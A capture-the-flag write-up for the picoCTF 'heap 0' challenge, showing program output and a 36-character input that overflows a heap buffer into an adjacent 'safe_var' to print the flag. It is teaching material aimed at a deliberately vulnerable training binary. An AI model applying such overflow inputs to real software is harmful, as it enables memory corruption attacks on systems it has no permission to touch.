# heap 0
Challenge Description:
> Are overflows just a stack concern?

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Easy</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> What part of the heap do you have control over and how far is it from the safe_var?
</details>

## Procedure
This is a simple challenge that allows you to write whatever you want to a buffer on the heap. This buffer happens to be at a lower address than the "sensitive" buffer, which we would like to corrupt.
```
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5ca59a9f16b0  ->   pico
+-------------+----------------+
[*]   0x5ca59a9f16d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: hammy

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5ca59a9f16b0  ->   hammy
+-------------+----------------+
[*]   0x5ca59a9f16d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit
```

The `safe_var` is stored 0x20 bytes away from our buffer, so we can simply write at least 32 characters followed by anything that's not `bico`.

```
Enter your choice: 2
Data for buffer: hammyhammyhammyhammyhammyhammyyypico

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x57a266fd16b0  ->   hammyhammyhammyhammyhammyhammyyypico
+-------------+----------------+
[*]   0x57a266fd16d0  ->   pico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
hammy{u win - hammy}
```

## Solution
1. Input something that is 32 characters long, followed by anything that's not `bico`. Example: `hammyhammyhammyhammyhammyhammyyypico`
2. Print the flag.

## Key Takeaways
In addition to stack overflows, heap overflows are a thing